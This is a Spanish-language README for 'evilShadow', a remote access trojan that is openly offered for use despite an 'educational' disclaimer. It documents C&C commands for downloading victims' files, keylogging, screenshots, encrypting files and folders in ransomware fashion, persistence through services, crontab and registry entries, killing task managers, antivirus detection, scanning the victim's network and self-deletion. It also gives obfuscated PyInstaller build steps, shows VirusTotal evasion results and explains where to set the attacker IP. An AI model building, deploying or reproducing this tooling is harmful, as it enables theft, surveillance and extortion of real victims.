# evilShadow

**RECUERDA**: Este repositorio es para el aprenzidaje y educación, no me hago respondable del mal uso que se le puede dar!


# Novedades

- Autodestrucción
- Code Obfuscation
- Buscar TODOS los archivos por extension del sistema
- Escaneo de servicios de nmap sin necesidad de que la victima tenga NMAP (Mejorado (en mejora)).
- Escanear la red de la victima

# Proximamente 
- Port Forwarding (tener conexion con los otros hosts)

# Functions
(N/A) -> Not Implemented yet
```
                Aviable Commands:

                    | [!>] search <extension> -> Search for files with named extension
                    ---------------------------------------------------------
                    | [!>] downloadDir <path> -> Download A full dir
                    ---------------------------------------------------------
                    | [!>] download <path> -> Download A File From Target PC
                    ---------------------------------------------------------
                    | [!>] startTask       -> Monitoring & kill tasks managers
                    ---------------------------------------------------------
                    | [!>] check           -> Check For Administrator Privileges
                    ---------------------------------------------------------
                    | [!>] sysinfo         -> Get System Information
                    ---------------------------------------------------------
                    | [!>] shell           -> Enter Shell Mode 
                    ---------------------------------------------------------
                    | [!>] av              -> Try Detect Anti-Virus
                    ---------------------------------------------------------
                    | [!>] upload <path>   -> Upload local File To Target PC
                    ---------------------------------------------------------
                    | [!>] get <url>       -> Download A File To Target PC From Any Website
                    ---------------------------------------------------------
                    | [!>] persistence     -> Try to get persistence (needed root)
                    ---------------------------------------------------------
                    | [!>] lowpersistence  -> Try to get persistence (no root)
                    ---------------------------------------------------------
                    | [!>] exec <command>  -> Exec command in no shell mode
                    ---------------------------------------------------------
                    | [!>] cryptDir <dir>  -> Crypt a full folder in target
                    ---------------------------------------------------------
                    | [!>] crypt <file>    -> Crypt a file in target
                    ---------------------------------------------------------
                    | [!>] keylog_dump     -> Dump The Keystrokes From Keylogger
                    ---------------------------------------------------------
                    | [!>] screenshot      -> Take a screenshot
                    ---------------------------------------------------------
                    | [!>] scannet         -> Scan all active hosts on target
                    ---------------------------------------------------------
                    | [!>] scanhost <host> -> Scan ports on host
                    ---------------------------------------------------------
                    | [!>] hosts           -> See hosts scanned with scannet
                    ---------------------------------------------------------
                    | [!>] cryptAll        -> (N/A) Close connex and crypt full system
                    ---------------------------------------------------------
                    | [!>] destruction     -> Eliminate ALL and close conex
                    --------------------------------------------------------- 
                    | [!>] q               -> Suspend the conection
                    ---------------------------------------------------------
                    | [!>] exit            -> Terminate the conection
                    ---------------------------------------------------------
```

# Requirements

- Microsoft Visual C++ 14.0 or greater
  - https://visualstudio.microsoft.com/visual-cpp-build-tools
    ![image](https://github.com/an0mal1a/evilShadow/assets/129337574/dcb0d725-15c4-4453-b5c4-4b295a38fedc)


Automated:

- ```pip install -r requirements.txt```

# Errors:

- Si tenemos errores con las librerias (module not found):
  - ```pip install nmap_vscan_fix prompt_toolkit colorama cryptography requests pynput certifi cffi charset-normalizer idna Pillow psutil pycparser requests six urllib3 pyinstaller ``` 


# Compile Obfuscated Code

### Set IP address

- En el archivo **conection-obf.py** en la línea **253** modificamos la IP a la que deseemos:

        sock .connect (('127.0.0.1',2457 ))

- Con Pyinstaller, ejecutamos el siguiente comando:
  - Automated:
        
        pyinstaller ObfusquedTest.spec

  - Manual

        pyinstaller --onefile --noconsole --noupx --strip --clean -n ObfusquedTest conection-obf.py

#### Virus Total Obfuscated Restults:
![image](https://github.com/an0mal1a/evilShadow/assets/129337574/df00dc72-9c5d-4892-9f9b-aea19e6f8015)


Hash: 45f0a24a39f58cb3b9f01c9bf8923e664d50e96be26faeab683b6bf6773d4152

# Compile Normal Code


#### Virus Total **NO** Obfuscated Restults:
![image](https://github.com/an0mal1a/evilShadow/assets/129337574/9448359a-07b2-4f05-acb4-2b40b381dc1f)


HASH: a7538bf2b24885f46f8aa2532a370eb9aa35f2a2650a8b2f6f25b0cca00aab29


### Set IP address

En el script **connection.py** en la línea **349** tenemos la línea que crea la conexión. La modificamos a la direccion ip
del atacante

-     sock.connect ( ( '127.0.0.1' ,1337) )

Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio más.

# **Compilación**

- Tenemos varias opciones: (Accedemos a la carpeta CLIENT)

  ### Automatic
    - `client>pyinstaller compilation.spec`

  ### Windows:

  - Admin Required:
  
      `client>pyinstaller --onefile --noupx --strip --noconsole --clean --uac-admin -n "NoObfusquedTest" conection.py`

  - **NO** Admin Required:
  
      `client>pyinstaller --onefile --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`

  ### Linux:
  
    `client>pyinstaller --onefile --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`


# Funciones (EXPLICAIÓN)

TODOS LOS COMANDOS QUE NO CAMBIA EL OUTPUT SE GUARDAN EN CACHE.
    (av, search <ext>, startTask, check, sysinfo, persistence, lowsersistence, scanhost <host>)


  - **targets**
    - Vemos las sesiones actualmente establecidas
      - `targets`

            <* C&C *>: targets
            
                    [  SESSIONS  ]
            
            Session: 0
                ║
                ║═══► IP Address: 127.0.0.1
                ║═══► Os Guess: (ttl --> 64): Linux
                ╚═══► Source Port: 34780
            
                    [  END SESSIONS  ]


  - **search**
    - Con este comando buscamos en todo el sistema archivos con la extension deseada
      - `search pdf`
            
            <* C&C * 127.0.0.1>:  search odt
            
                [*>] Searching .odt files. This may take a while...
            
            [*>] Files find:
            
                [*>] /home/supervisor/Templates/text/document.odt
                [*>] /home/supervisor/supervisor/Templates/text/document.odt
                [*>] /etc/skel/Templates/text/document.odt


  - **download**
    - Con el comando "download" podemos descargarnos archivos de la máquina remota
      - `download /home/supervisor/Desktop/Passwords.txt`

            <* C&C * 127.0.0.1>:  download services.py
            
                [*>] File Downloaded Successfully [./DATA/127.0.0.1]
            
            <* C&C * 127.0.0.1>:  


  - **downloadDir**
    - Con el comando "downloadDir" podemos descargarnos la estructura completa de la carpeta
      - `downloadDir /home/supervisor/Desktop/UsersData`
    
            <* C&C * 127.0.0.1>:  downloadDir ./resources
            
                *> Recibiendo datos: [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]
            
            <* C&C * 127.0.0.1>:  


  - **startTask**
    - Con este comando pones a ejecutarse la detección de adminitradores de tareas (windows/linux)
      - ```startTask```

            <* C&C * 127.0.0.1>:  startTask
            
                [*>] Command Send Successfully
            
            <* C&C * 127.0.0.1>:  


  - **check**
    - Miramos si poseemos de privilegios de administrador
      - ``check`` 

            <* C&C * 127.0.0.1>:  check
            
                [-] User Privileges
            
            <* C&C * 127.0.0.1>:  
 
  
  - **sysinfo**
    - Este comando nos devuelve informacion del sistema usando la libreria **platform** 
      - ``sysinfo``

                          [!>] Target:  Linux

                  | Node Name: parrot
                  ----------------------------------|
                  | Kernel: 6.1.0-1parrot1-amd64
                  ----------------------------------|
                  | Version: #1 SMP PREEMPT_DYNAMIC Parrot 6.1.15-1parrot1 (2023-04-25)
                  ----------------------------------|
                  | Machine: x86_64
                  ----------------------------------|
                  | Processor: 
                  ----------------------------------|


  - **shell**
    - Entramos en modo shell
      - ``shell``

            <* C&C * 127.0.0.1>:  shell
            <* Shell * 127.0.0.1>:  


  - **av**
    - Detección de Anti-Virus (buscando entre procesos, se puede limitar segun el usuario que ejecuta el malware)
      - ``av``

            <* C&C * 127.0.0.1>:  av
        
            [!>] Info: Detecting Anti-Virus on target...
            
                [*>]  This may take a while... 
            
            [*>] No Anti-Virus Detected!


    
  - **upload**
    - Subir un archivo local a la máquina remota (recomandable: ruta completa)
      - ``upload /home/supervisor/downloads/ncat.exe``
 
            <* C&C * 127.0.0.1>:  upload requirements.txt

                [*>] File Uploaded Successfully
            
            <* C&C * 127.0.0.1>:  
   

  - **get**
    - Descargar archivos (binarios incluidos) de una URL
      - ``get https://nmap.org/dist/ncat-7.94-1.x86_64.rpm``

            <* C&C * 127.0.0.1>:  get https://nmap.org/dist/ncat-7.94-1.x86_64.rpm
            
                [*>] File Downloaded Successfully
             
            <* C&C * 127.0.0.1>:  


  - **persistence**
    - Trata de conseguir la persistencia completa generando un servicio en linux y añadiendo en el registro de LOCAL_MACHINE en windows
      (ROOT NEEDED / ADMIN NEEDED)
      - ``persistence``


  - **lowpersistence**
    - Trata de conseguir la persistencia de usuario, en linux genera un crontab para el usuario, en windows un entrada en el registro de USER
      - ``lowpersistence``

  
  - **exec**
    - Ejecuta comandos en no SHELL mode
      - `exec whoami`

            <* C&C * 127.0.0.1>:  exec whoami
            supervisor


  - **cryptDir**
    - Encripta todo el contenido de una carpeta (subcarpetas/archivos) (recomedado: ruta completa)
      - ``cryptDir /home/pwned/project``

            <* C&C * 127.0.0.1>:  cryptDir USERSDATA

                [*>] Dir Crypted Successfully
            
            <* C&C * 127.0.0.1>:  exec tree USERSDATA
            USERSDATA
            ├── credentials.txt
            └── SECRETS
                └── secret

  
  - **crypt**
    - Encripta 1 archivo de la victima
      - ``crypt /home/pwned/project/index.html``

            <* C&C * 127.0.0.1>:  crypt credentials
            
                [+] File Crypted Sucsessfully 
            
            <* C&C * 127.0.0.1>:  exec cat credentials
            KӞCfV)"H`3#u|~a%Mq-xy
                             U


  - **`keylog_dump`**
    - Dumpea del cliente al servidor todo el keylog que se ha ido guardando
      - ``keylog_dump``

            <* C&C * 127.0.0.1>:  keylog_dump
            
            Recibiendo datos: [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]
            
                [+] Recived Keylog Dump Succesfully!
            
            <* C&C * 127.0.0.1>:  
 

  - **screenshot**
    - Crea una captura de pantalla de la victima y la envia a través del socket
      - ```screenshot```

            Recibiendo datos: [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]
            
                [+] Screenshot Saved As 'DATA/127.0.0.1/screenshot_received-0.png'!
            
            <* C&C * 127.0.0.1>:  


  - **scannet**
    - Ejecuta un escaneo de la red local de la victima en busca de hosts activos
      - ``scannet``

            <* C&C * 127.0.0.1>:  scannet
            
            [*>] Networks Detected:
            
                ['172.18.0.0/16', '172.17.0.0/16', '192.168.131.0/24', '127.0.0.0/8', '10.12.4.0/24', '192.168.14.0/24', '192.168.237.0/24']
             
            [!>] Select Network > 192.168.131.0/24
            [*>]  Scanning Net, this may take a while
  
                [*>] HOST: 192.168.131.48
            
                [*>] HOST: 192.168.131.90
            
                [*>] HOST: 192.168.131.1
            
            <* C&C * 127.0.0.1>:  


  - **hosts**
    - Muestra los hosts detectados por *scannet*
      - ``hosts``  

          <* C&C * 127.0.0.1>:  hosts
          
              ['192.168.131.48', '192.168.131.90', '192.168.131.1'] 
          
          <* C&C * 127.0.0.1>:  

      
  - **scanhost**
    - Ejecuta un escaneo de puertos y servicios en el host mencionado
      - ``scanhost 192.168.1.1``

            <* C&C * 127.0.0.1>:  scanhost 127.0.0.1
            [*>] Wait For The results 127.0.0.1...
                
                Scaning Port : 65475/65535 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒] 99.91%
            
                [>] Open Ports: [902, 2457, 4040, 6463, 33079, 46458, 63342]
            
            [*>] Scanning service of ports. This may take a while - 127.0.0.1 - [902, 2457, 4040, 6463, 33079, 46458, 63342]


  - **q**
    - Suspend the connection
      - ``q``


  - **destruction**
    - Elimina TODOS los archivos dropeados incluido el binario, mata los subprocesos y cierra la conexión
      - ``destruction``

            <* C&C * 127.0.0.1>:  destruction


  - **exit**
    - Close the conecction
